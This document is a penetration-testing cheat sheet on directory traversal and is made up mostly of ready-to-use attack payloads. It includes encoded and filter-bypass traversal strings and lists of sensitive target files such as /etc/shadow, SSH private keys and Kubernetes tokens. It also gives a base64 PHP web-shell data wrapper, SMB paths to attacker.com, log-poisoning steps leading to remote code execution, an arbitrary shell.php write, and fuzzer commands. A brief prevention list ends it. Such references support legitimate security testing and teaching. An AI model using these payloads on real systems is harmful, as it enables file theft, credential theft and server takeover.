# Directory Traversal

## Description
Directory Traversal (also known as Path Traversal or Dot-Dot-Slash) is a vulnerability that allows attackers to access files and directories outside the intended directory. By manipulating file path references with sequences like `../`, attackers can read sensitive files or potentially write to arbitrary locations.

## Basic Payloads

### Unix/Linux
```
../
../../
../../../
../../../../
../../../../../
../../../../../../etc/passwd
../../../etc/passwd
....//....//....//etc/passwd
```

### Windows
```
..\
..\..\
..\..\..\
..\..\..\..\
..\..\..\..\..\
..\..\..\..\..\..\windows\win.ini
..\..\..\windows\system32\config\sam
```

## Encoding Bypass Techniques

### 1. URL Encoding
```
%2e%2e%2f                   # ../
%2e%2e/                     # ../
..%2f                       # ../
%2e%2e%5c                   # ..\
..%5c                       # ..\
```

### 2. Double URL Encoding
```
%252e%252e%252f             # ../
%252e%252e/                 # ../
..%252f                     # ../
%252e%252e%255c             # ..\
```

### 3. UTF-8 Encoding
```
%c0%ae%c0%ae%c0%af          # ../
%c0%ae%c0%ae/               # ../
..%c0%af                    # ../
%c1%1c                      # /
%c0%9v                      # \
```

### 4. 16-bit Unicode Encoding
```
%u002e%u002e%u002f          # ../
%u002e%u002e/               # ../
..%u2215                    # ../
..%u2216                    # ..\
```

### 5. Overlong UTF-8 Encoding
```
%c0%2e%c0%2e%c0%af          # ../
..%c0%af                    # ../
%e0%40%ae%e0%40%ae%e0%80%af # ../
```

## Filter Bypass Techniques

### 1. Nested Traversal
```
....//                      # Becomes ../ after filter removes ../
....\/
....\\
..../
....//....//....//etc/passwd
```

### 2. Backslash Substitution
```
..\/etc/passwd
..\\/etc/passwd
```

### 3. Null Byte Injection (PHP < 5.3.4)
```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png
../../../etc/passwd\0
```

### 4. Path Truncation
```
../../../etc/passwd.......................
../../../etc/passwd./././././././././././././
../../../[..]../[..]../etc/passwd
```

### 5. UNC Path (Windows)
```
\\localhost\c$\windows\win.ini
\\127.0.0.1\c$\windows\win.ini
//localhost/c$/windows/win.ini
```

### 6. Absolute Path
```
/etc/passwd
C:\Windows\win.ini
C:/Windows/win.ini
```

## OS-Specific Interesting Files

### Linux
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/issue
/etc/group
/etc/motd
/etc/mysql/my.cnf
/etc/ssh/sshd_config
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/proc/version
/proc/net/tcp
/proc/net/udp
/proc/net/fib_trie
/proc/sched_debug
/var/log/auth.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/root/.bash_history
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/[user]/.bash_history
/home/[user]/.ssh/id_rsa
```

### Windows
```
C:\Windows\win.ini
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SOFTWARE
C:\Windows\System32\drivers\etc\hosts
C:\Windows\debug\NetSetup.log
C:\Windows\iis.log
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\mysql\data\mysql\user.MYD
C:\xampp\tomcat\conf\tomcat-users.xml
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Users\[user]\Desktop\
C:\Users\[user]\Documents\
C:\Users\[user]\AppData\Local\
```

### macOS
```
/etc/passwd
/etc/master.passwd
/etc/hosts
/private/etc/passwd
/private/var/log/system.log
/Users/[user]/.bash_history
/Users/[user]/.ssh/id_rsa
/Library/Preferences/
```

### Application-Specific
```
# Apache Tomcat
/WEB-INF/web.xml
/WEB-INF/classes/
/META-INF/MANIFEST.MF

# Java
/WEB-INF/applicationContext.xml
/WEB-INF/struts-config.xml

# WordPress
/wp-config.php
/wp-includes/version.php

# Kubernetes
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
/var/run/secrets/kubernetes.io/serviceaccount/namespace
```

## Advanced Payloads

### Wrapper-based (PHP)
```
# File wrapper
file:///etc/passwd

# PHP filter for base64 encoding
php://filter/convert.base64-encode/resource=/etc/passwd

# Data wrapper
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

### SMB Path (Windows)
```
\\attacker.com\share\malicious.txt
//attacker.com/share/malicious.txt
```

### Absolute Path Variations
```
///etc/passwd
/./etc/passwd
/etc/./passwd
/etc/passwd/.
```

## Tools

### dotdotpwn
```bash
# Directory traversal fuzzer
dotdotpwn -m http -h target.com -o unix -f /etc/passwd -k "root:" -r report.txt

# Options:
# -m: Module (http, http-url, ftp, tftp, payload, stdout)
# -h: Hostname
# -o: Operating system (unix, windows)
# -f: File to retrieve
# -k: Keyword to search in response
```

### Manual Fuzzing with ffuf
```bash
ffuf -w traversal-payloads.txt -u "https://target.com/file?path=FUZZ" -fs 0

# With encoding
ffuf -w traversal-payloads.txt -u "https://target.com/file?path=FUZZ" -e .php,.txt,.log
```

### Burp Suite Intruder
```
1. Capture request with file parameter
2. Send to Intruder
3. Use traversal payload list
4. Analyze responses for file content
```

## IIS Short Name Scanner

```bash
# Enumerate 8.3 short filenames on IIS
java -jar iis_shortname_scanner.jar http://target.com/

# Or use shortscan
shortscan http://target.com/
```

## Detection Patterns

### Vulnerable Parameters
```
file=
path=
document=
folder=
root=
pg=
style=
pdf=
template=
php_path=
doc=
img=
filename=
url=
```

### Vulnerable Functionality
```
- File downloads
- Image loading
- Document viewers
- Template loading
- Log viewers
- Backup/restore functions
- Import/export functions
```

## Exploitation Scenarios

### 1. Read Sensitive Files
```http
GET /download?file=../../../etc/passwd HTTP/1.1
```

### 2. Source Code Disclosure
```http
GET /page?template=../../../var/www/html/config.php HTTP/1.1
```

### 3. Log Poisoning (LFI to RCE)
```bash
# Inject PHP code in User-Agent
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/

# Include access log
GET /page?file=../../../var/log/apache2/access.log&cmd=id HTTP/1.1
```

### 4. Write to Arbitrary Files
```http
POST /upload HTTP/1.1
filename=../../../var/www/html/shell.php
```

## Prevention

```
1. Validate user input against whitelist
2. Use basename() to extract filename only
3. Implement chroot jail
4. Avoid passing user input to filesystem functions
5. Use realpath() and verify path is within allowed directory
6. Remove or encode path traversal sequences
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
- https://owasp.org/www-community/attacks/Path_Traversal
- https://portswigger.net/web-security/file-path-traversal
